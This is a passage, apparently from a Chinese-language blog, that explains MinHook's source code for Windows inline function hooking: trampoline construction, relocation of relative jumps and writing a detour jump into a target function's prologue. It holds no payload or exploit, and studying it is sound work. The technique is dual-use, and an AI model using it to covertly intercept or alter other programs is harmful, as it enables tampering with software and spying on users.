class="function"></span>&#123;</span><br><span class="line"> 	<span class="keyword">return</span> fpMessageBoxW(hWnd, <span class="string">L"Hooked!"</span>, lpCaption, uType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Initialize MinHook.</span></span><br><span class="line">	<span class="keyword">if</span> (MH_Initialize() != MH_OK)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Create a hook for MessageBoxW, in disabled state.</span></span><br><span class="line">	<span class="keyword">if</span> (MH_CreateHook(&amp;MessageBoxW, &amp;DetourMessageBoxW,</span><br><span class="line">		<span class="keyword">reinterpret_cast</span>&lt;LPVOID*&gt;(&amp;fpMessageBoxW)) != MH_OK)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// or you can use the new helper function like this.</span></span><br><span class="line">	<span class="comment">//if (MH_CreateHookApiEx(</span></span><br><span class="line">	<span class="comment">//    L"user32", "MessageBoxW", &amp;DetourMessageBoxW, &amp;fpMessageBoxW) != MH_OK)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//    return 1;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">	<span class="comment">// Enable the hook for MessageBoxW.</span></span><br><span class="line">	<span class="keyword">if</span> (MH_EnableHook(&amp;MessageBoxW) != MH_OK)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Expected to tell "Hooked!".</span></span><br><span class="line">	MessageBoxW(<span class="literal">NULL</span>, <span class="string">L"Not hooked..."</span>, <span class="string">L"MinHook Sample"</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Disable the hook for MessageBoxW.</span></span><br><span class="line">	<span class="keyword">if</span> (MH_DisableHook(&amp;MessageBoxW) != MH_OK)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Expected to tell "Not hooked...".</span></span><br><span class="line">	MessageBoxW(<span class="literal">NULL</span>, <span class="string">L"Not hooked..."</span>, <span class="string">L"MinHook Sample"</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Uninitialize MinHook.</span></span><br><span class="line">	<span class="keyword">if</span> (MH_Uninitialize() != MH_OK)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x2-初始化钩子的过程"><a href="#0x2-初始化钩子的过程" class="headerlink" title="0x2 初始化钩子的过程"></a>0x2 初始化钩子的过程</h3><p>根据这个调用流程跟踪一下源代码，首先看<code>MH_Initialize</code>函数，此函数就干了一件事情，初始化了一个大小自增长的堆，并将堆的句柄存储在全局变量<code>g_hHeap</code>中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_hHeap = HeapCreate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>接下来就是创建hook的过程了，这里需要注意几个结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PHOOK_ENTRY pItems;     <span class="comment">// Data heap</span></span><br><span class="line">    UINT        capacity;   <span class="comment">// Size of allocated data heap, items</span></span><br><span class="line">    UINT        <span class="built_in">size</span>;       <span class="comment">// Actual number of data items</span></span><br><span class="line">&#125; g_hooks;</span><br></pre></td></tr></table></figure>

<p>g_hooks是一个全局变量，此结构体存储了当前创建的所有钩子，每个钩子的信息都存在了<code>pItems</code>这个指针里。<code>PHOOK_ENTRY</code>结构体的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">HOOK_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LPVOID pTarget;             <span class="comment">// Address of the target function.</span></span><br><span class="line">    LPVOID pDetour;             <span class="comment">// Address of the detour or relay function.</span></span><br><span class="line">    LPVOID pTrampoline;         <span class="comment">// Address of the trampoline function.</span></span><br><span class="line">    UINT8  backup[<span class="number">8</span>];           <span class="comment">// Original prologue of the target function.</span></span><br><span class="line"></span><br><span class="line">    UINT8  patchAbove  : <span class="number">1</span>;     <span class="comment">// Uses the hot patch area.</span></span><br><span class="line">    UINT8  isEnabled   : <span class="number">1</span>;     <span class="comment">// Enabled.</span></span><br><span class="line">    UINT8  queueEnable : <span class="number">1</span>;     <span class="comment">// Queued for enabling/disabling when != isEnabled.</span></span><br><span class="line"></span><br><span class="line">    UINT   nIP : <span class="number">4</span>;             <span class="comment">// Count of the instruction boundaries.</span></span><br><span class="line">    UINT8  oldIPs[<span class="number">8</span>];           <span class="comment">// Instruction boundaries of the target function.</span></span><br><span class="line">    UINT8  newIPs[<span class="number">8</span>];           <span class="comment">// Instruction boundaries of the trampoline function.</span></span><br><span class="line">&#125; HOOK_ENTRY, *PHOOK_ENTRY;</span><br></pre></td></tr></table></figure>

<p><code>pTarget</code>存储了被hook的函数的地址，<code>pDetour</code>是你写的假的函数的地址，<code>pTrampoline</code>是一个中间的跳转函数，一会再细说。<code>backup[8]</code>是对被<code>Hook</code>函数的前五字节的备份，<code>nIp</code>表示被Hook函数的前五个字节可以是几条指令，<code>oldIPs</code>,<code>newIPs</code>分别存储了被Hook函数前五字节每条指令的偏移和中间跳转函数对应的每条指令的偏移，关于这个一会再细说。</p>
<p>接下来调用<code>MH_CreateHook</code>函数，在这个函数里面，首先调用<code>FindHookEntry</code>查找<code>g_hooks</code>中是否已经存放了被hook的目标，如果不存在，就进入创建一个<code>_HOOK_ENTRY</code>的过程。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> UINT <span class="title">FindHookEntry</span><span class="params">(LPVOID pTarget)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UINT i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_hooks.<span class="built_in">size</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ULONG_PTR)pTarget == (ULONG_PTR)g_hooks.pItems[i].pTarget)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> INVALID_HOOK_POS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在初始化<code>_HOOK_ENTRY</code>之前先要初始化一个<code>_TRAMPOLINE</code>，这部分是minHook的关键,结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TRAMPOLINE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LPVOID pTarget;         <span class="comment">// [In] Address of the target function.</span></span><br><span class="line">    LPVOID pDetour;         <span class="comment">// [In] Address of the detour function.</span></span><br><span class="line">    LPVOID pTrampoline;     <span class="comment">// [In] Buffer address for the trampoline and relay function.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">    LPVOID pRelay;          <span class="comment">// [Out] Address of the relay function.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    BOOL   patchAbove;      <span class="comment">// [Out] Should use the hot patch area?</span></span><br><span class="line">    UINT   nIP;             <span class="comment">// [Out] Number of the instruction boundaries.</span></span><br><span class="line">    UINT8  oldIPs[<span class="number">8</span>];       <span class="comment">// [Out] Instruction boundaries of the target function.</span></span><br><span class="line">    UINT8  newIPs[<span class="number">8</span>];       <span class="comment">// [Out] Instruction boundaries of the trampoline function.</span></span><br><span class="line">&#125; TRAMPOLINE, *PTRAMPOLINE;</span><br></pre></td></tr></table></figure>

<p>这个结构体其他部分的定义跟<code>_HOOK_ENTRY</code>结构体一毛一样，但是这里有一个初始化<code>pTrampoline</code>指针的函数<code>AllocateBuffer</code>，此函数中核心逻辑在<code>GetMemoryBlock</code>中，关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">while</span> ((ULONG_PTR)pAlloc &gt;= minAddr)</span><br><span class="line">    &#123;</span><br><span class="line">        pAlloc = FindPrevFreeRegion(pAlloc, (LPVOID)minAddr, si.dwAllocationGranularity); <span class="comment">// 按照虚拟内存分配粒度找一块free的内存空间</span></span><br><span class="line">        <span class="keyword">if</span> (pAlloc == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        pBlock = (PMEMORY_BLOCK)VirtualAlloc(</span><br><span class="line">            pAlloc, MEMORY_BLOCK_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        <span class="keyword">if</span> (pBlock != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Alloc a new block below if not found.</span></span><br><span class="line"><span class="keyword">if</span> (pBlock == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    LPVOID pAlloc = pOrigin;</span><br><span class="line">    <span class="keyword">while</span> ((ULONG_PTR)pAlloc &lt;= maxAddr)</span><br><span class="line">    &#123;</span><br><span class="line">        pAlloc = FindNextFreeRegion(pAlloc, (LPVOID)maxAddr, si.dwAllocationGranularity);</span><br><span class="line">        <span class="keyword">if</span> (pAlloc == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        pBlock = (PMEMORY_BLOCK)VirtualAlloc(</span><br><span class="line">            pAlloc, MEMORY_BLOCK_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        <span class="keyword">if</span> (pBlock != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大意是在被Hook函数的左右512M空间找找到处于空闲状态的内存空间，并返回其地址。接下来就是初始化<code>TRAMPOLINE</code>结构体的函数<code>CreateTrampolineFunction</code>，此函数比较复杂，在一个大的do-while循环中主要干了两件事情</p>
<ol>
<li>将被Hook的函数的前五个字节放置在<code>pTrampoline</code>指向的buffer中，创建中间函数。也就是我们自己定义函数指针<code>fpMessageBoxW</code>的函数体。但是在拷贝的时候，比较麻烦的一点就是，需要进行指令分析，因为<code>call</code>，<code>jmp</code>,<code>jcc</code>这类指令的操作数需要做相对地址转换（都是相对于eip的）。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        HDE       hs;</span><br><span class="line">        UINT      copySize;</span><br><span class="line">        LPVOID    pCopySrc;</span><br><span class="line">        ULONG_PTR pOldInst = (ULONG_PTR)ct-&gt;pTarget     + oldPos;</span><br><span class="line">        ULONG_PTR pNewInst = (ULONG_PTR)ct-&gt;pTrampoline + newPos;</span><br><span class="line"></span><br><span class="line">        copySize = HDE_DISASM((LPVOID)pOldInst, &amp;hs); <span class="comment">//对目标代码进行反汇编</span></span><br><span class="line">        <span class="keyword">if</span> (hs.flags &amp; F_ERROR)</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">        pCopySrc = (LPVOID)pOldInst;</span><br><span class="line">        <span class="keyword">if</span> (oldPos &gt;= <span class="keyword">sizeof</span>(JMP_REL))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The trampoline function is long enough.</span></span><br><span class="line">            <span class="comment">// Complete the function with the jump to the target function.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">            jmp.address = pOldInst; <span class="comment">// x64模式写， 0xFF25 disp64进行jmp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">            jmp.operand = (UINT32)(pOldInst - (pNewInst + <span class="keyword">sizeof</span>(jmp)));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            pCopySrc = &amp;jmp;</span><br><span class="line">            copySize = <span class="keyword">sizeof</span>(jmp);</span><br><span class="line"></span><br><span class="line">            finished = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((hs.modrm &amp; <span class="number">0xC7</span>) == <span class="number">0x05</span>) <span class="comment">// 在x64模式下添加的 [rip+disp32] 的间接寻址模式</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Instructions using RIP relative addressing. (ModR/M = 00???101B)</span></span><br><span class="line">			<span class="comment">// 使用RIP相对指令跳转</span></span><br><span class="line">            <span class="comment">// Modify the RIP relative address.</span></span><br><span class="line">            PUINT32 pRelAddr;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Avoid using memcpy to reduce the footprint.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _MSC_VER</span></span><br><span class="line">            <span class="built_in">memcpy</span>(instBuf, (LPBYTE)pOldInst, copySize);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">            __movsb(instBuf, (LPBYTE)pOldInst, copySize);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            pCopySrc = instBuf;</span><br><span class="line">            <span class="comment">// Relative address is stored at (instruction length - immediate value length - 4).</span></span><br><span class="line">            pRelAddr = (PUINT32)(instBuf + hs.len - ((hs.flags &amp; <span class="number">0x3C</span>) &gt;&gt; <span class="number">2</span>) - <span class="number">4</span>);</span><br><span class="line">            *pRelAddr</span><br><span class="line">                = (UINT32)((pOldInst + hs.len + (INT32)hs.disp.disp32) - (pNewInst + hs.len)); </span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 写入相对跳转地址</span></span><br><span class="line">            <span class="comment">// Complete the function if JMP (FF /4).</span></span><br><span class="line">            <span class="keyword">if</span> (hs.opcode == <span class="number">0xFF</span> &amp;&amp; hs.modrm_reg == <span class="number">4</span>)</span><br><span class="line">                finished = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (hs.opcode == <span class="number">0xE8</span>) <span class="comment">// 如果是call指令</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Direct relative CALL</span></span><br><span class="line">            ULONG_PTR dest = pOldInst + hs.len + (INT32)hs.imm.imm32; <span class="comment">//call 指令的目的跳转地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">            call.address = dest;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">            call.operand = (UINT32)(dest - (pNewInst + <span class="keyword">sizeof</span>(call))); <span class="comment">// 修改call指令的目的跳转地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            pCopySrc = &amp;call;</span><br><span class="line">            copySize = <span class="keyword">sizeof</span>(call);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((hs.opcode &amp; <span class="number">0xFD</span>) == <span class="number">0xE9</span>) <span class="comment">// 如果是jmp</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Direct relative JMP (EB or E9)</span></span><br><span class="line">            ULONG_PTR dest = pOldInst + hs.len;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (hs.opcode == <span class="number">0xEB</span>) <span class="comment">// isShort jmp</span></span><br><span class="line">                dest += (INT8)hs.imm.imm8;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dest += (INT32)hs.imm.imm32;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Simply copy an internal jump.</span></span><br><span class="line">            <span class="keyword">if</span> ((ULONG_PTR)ct-&gt;pTarget &lt;= dest</span><br><span class="line">                &amp;&amp; dest &lt; ((ULONG_PTR)ct-&gt;pTarget + <span class="keyword">sizeof</span>(JMP_REL)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (jmpDest &lt; dest)</span><br><span class="line">                    jmpDest = dest;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span><br><span class="line">                jmp.address = dest;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">                jmp.operand = (UINT32)(dest - (pNewInst + <span class="keyword">sizeof</span>(jmp)));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                pCopySrc = &amp;jmp;</span><br><span class="line">                copySize = <span class="keyword">sizeof</span>(jmp);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Exit the function If it is not in the branch</span></span><br><span class="line">                finished = (pOldInst &gt;= jmpDest);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((hs.opcode &amp; <span class="number">0xF0</span>) == <span class="number">0x70</span></span><br><span class="line">            || (hs.opcode &amp; <span class="number">0xFC</span>) == <span class="number">0xE0</span></span><br><span class="line">            || (hs.opcode2 &amp; <span class="number">0xF0</span>) == <span class="number">0x80</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Direct relative Jcc</span></span><br><span class="line">            ULONG_PTR dest = pOldInst + hs.len;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((hs.opcode &amp; <span class="number">0xF0</span>) == <span class="number">0x70</span>      <span class="comment">// Jcc</span></span><br><span class="line">                || (hs.opcode &amp; <span class="number">0xFC</span>) == <span class="number">0xE0</span>)  <span class="comment">// LOOPNZ/LOOPZ/LOOP/JECXZ</span></span><br><span class="line">                dest += (INT8)hs.imm.imm8;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dest += (INT32)hs.imm.imm32;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Simply copy an internal jump.</span></span><br><span class="line">            <span class="keyword">if</span> ((ULONG_PTR)ct-&gt;pTarget &lt;= dest</span><br><span class="line">                &amp;&amp; dest &lt; ((ULONG_PTR)ct-&gt;pTarget + <span class="keyword">sizeof</span>(JMP_REL)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (jmpDest &lt; dest)</span><br><span class="line">                    jmpDest = dest;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((hs.opcode &amp; <span class="number">0xFC</span>) == <span class="number">0xE0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// LOOPNZ/LOOPZ/LOOP/JCXZ/JECXZ to the outside are not supported.</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                UINT8 cond = ((hs.opcode != <span class="number">0x0F</span> ? hs.opcode : hs.opcode2) &amp; <span class="number">0x0F</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">                <span class="comment">// Invert the condition in x64 mode to simplify the conditional jump logic.</span></span><br><span class="line">                jcc.opcode  = <span class="number">0x71</span> ^ cond;</span><br><span class="line">                jcc.address = dest;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">                jcc.opcode1 = <span class="number">0x80</span> | cond;</span><br><span class="line">                jcc.operand = (UINT32)(dest - (pNewInst + <span class="keyword">sizeof</span>(jcc)));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                pCopySrc = &amp;jcc;</span><br><span class="line">                copySize = <span class="keyword">sizeof</span>(jcc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((hs.opcode &amp; <span class="number">0xFE</span>) == <span class="number">0xC2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// RET (C2 or C3)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Complete the function if not in a branch.</span></span><br><span class="line">            finished = (pOldInst &gt;= jmpDest);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can't alter the instruction length in a branch.</span></span><br><span class="line">        <span class="keyword">if</span> (pOldInst &lt; jmpDest &amp;&amp; copySize != hs.len)</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Trampoline function is too large.</span></span><br><span class="line">        <span class="keyword">if</span> ((newPos + copySize) &gt; TRAMPOLINE_MAX_SIZE)</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Trampoline function has too many instructions.</span></span><br><span class="line">        <span class="keyword">if</span> (ct-&gt;nIP &gt;= ARRAYSIZE(ct-&gt;oldIPs))</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">        ct-&gt;oldIPs[ct-&gt;nIP] = oldPos;</span><br><span class="line">        ct-&gt;newIPs[ct-&gt;nIP] = newPos;</span><br><span class="line">        ct-&gt;nIP++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Avoid using memcpy to reduce the footprint.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _MSC_VER</span></span><br><span class="line">        <span class="built_in">memcpy</span>((LPBYTE)ct-&gt;pTrampoline + newPos, pCopySrc, copySize);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        __movsb((LPBYTE)ct-&gt;pTrampoline + newPos,(LPBYTE)pCopySrc, copySize);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        newPos += copySize;</span><br><span class="line">        oldPos += hs.len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!finished);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>接下来就是还需要在<code>pTrampoline</code>的末尾写上一个长跳转指令，跳转到被Hook函数的指定位置开始执行(注意不是被Hook函数的开始，因为被Hook函数的开始部分已经在pTrampoline指向的buffer的前五个字节中已经被执行了)。（其实这部分代码是在do-while循环中完成的）</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    JMP_ABS jmp = &#123;</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x00000000</span>, <span class="comment">// FF25 00000000: JMP [RIP+6]</span></span><br><span class="line">        <span class="number">0x0000000000000000</span>ULL   <span class="comment">// Absolute destination address</span></span><br><span class="line">    &#125;; </span><br><span class="line">    <span class="comment">// 0xff25的一个长跳转</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (oldPos &gt;= <span class="keyword">sizeof</span>(JMP_REL))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The trampoline function is long enough.</span></span><br><span class="line">            <span class="comment">// Complete the function with the jump to the target function.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">            jmp.address = pOldInst; <span class="comment">// x64模式写， 0xFF25 disp64进行jmp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">            jmp.operand = (UINT32)(pOldInst - (pNewInst + <span class="keyword">sizeof</span>(jmp)));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            pCopySrc = &amp;jmp;</span><br><span class="line">            copySize = <span class="keyword">sizeof</span>(jmp);</span><br><span class="line">            finished = TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-安装钩子"><a href="#0x3-安装钩子" class="headerlink" title="0x3 安装钩子"></a>0x3 安装钩子</h3><p>钩子函数已经初始化成功了，接下来就需要开始安装了，调用<code>MH_EnableHook</code>函数。核心操作在函数<code>EnableHookLL</code>中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> MH_STATUS <span class="title">EnableHookLL</span><span class="params">(UINT pos, BOOL enable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PHOOK_ENTRY pHook = &amp;g_hooks.pItems[pos];</span><br><span class="line">    DWORD  oldProtect;</span><br><span class="line">    SIZE_T patchSize    = <span class="keyword">sizeof</span>(JMP_REL);</span><br><span class="line">    LPBYTE pPatchTarget = (LPBYTE)pHook-&gt;pTarget;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pHook-&gt;patchAbove)</span><br><span class="line">    &#123;</span><br><span class="line">        pPatchTarget -= <span class="keyword">sizeof</span>(JMP_REL);</span><br><span class="line">        patchSize    += <span class="keyword">sizeof</span>(JMP_REL_SHORT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!VirtualProtect(pPatchTarget, patchSize, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">        <span class="keyword">return</span> MH_ERROR_MEMORY_PROTECT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable)</span><br><span class="line">    &#123;</span><br><span class="line">        PJMP_REL pJmp = (PJMP_REL)pPatchTarget;</span><br><span class="line">        pJmp-&gt;opcode = <span class="number">0xE9</span>;</span><br><span class="line">        pJmp-&gt;operand = (UINT32)((LPBYTE)pHook-&gt;pDetour - (pPatchTarget + <span class="keyword">sizeof</span>(JMP_REL)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pHook-&gt;patchAbove)</span><br><span class="line">        &#123;</span><br><span class="line">            PJMP_REL_SHORT pShortJmp = (PJMP_REL_SHORT)pHook-&gt;pTarget;</span><br><span class="line">            pShortJmp-&gt;opcode = <span class="number">0xEB</span>;</span><br><span class="line">            pShortJmp-&gt;operand = (UINT8)(<span class="number">0</span> - (<span class="keyword">sizeof</span>(JMP_REL_SHORT) + <span class="keyword">sizeof</span>(JMP_REL)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pHook-&gt;patchAbove)</span><br><span class="line">            <span class="built_in">memcpy</span>(pPatchTarget, pHook-&gt;backup, <span class="keyword">sizeof</span>(JMP_REL) + <span class="keyword">sizeof</span>(JMP_REL_SHORT));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">memcpy</span>(pPatchTarget, pHook-&gt;backup, <span class="keyword">sizeof</span>(JMP_REL));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    VirtualProtect(pPatchTarget, patchSize, oldProtect, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Just-in-case measure.</span></span><br><span class="line">    FlushInstructionCache(GetCurrentProcess(), pPatchTarget, patchSize);</span><br><span class="line"></span><br><span class="line">    pHook-&gt;isEnabled   = enable;</span><br><span class="line">    pHook-&gt;queueEnable = enable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> MH_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心代码就下面三行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PJMP_REL pJmp = (PJMP_REL)pPatchTarget;</span><br><span class="line">pJmp-&gt;opcode = <span class="number">0xE9</span>;</span><br><span class="line">pJmp-&gt;operand = (UINT32)((LPBYTE)pHook-&gt;pDetour - (pPatchTarget + <span class="keyword">sizeof</span>(JMP_REL)));</span><br></pre></td></tr></table></figure>

<p>在被Hook的函数的前五个字节写上<code>0xe9+跳转地址</code>,跳转到我们创建假的函数地址的位置。</p>
<p>但是再执行<code>EnableHookLL</code>还要执行一个操作，就是先暂停本进程出去本线程之外的所有线程,调用<code>freeze</code>函数实现操作：</p>
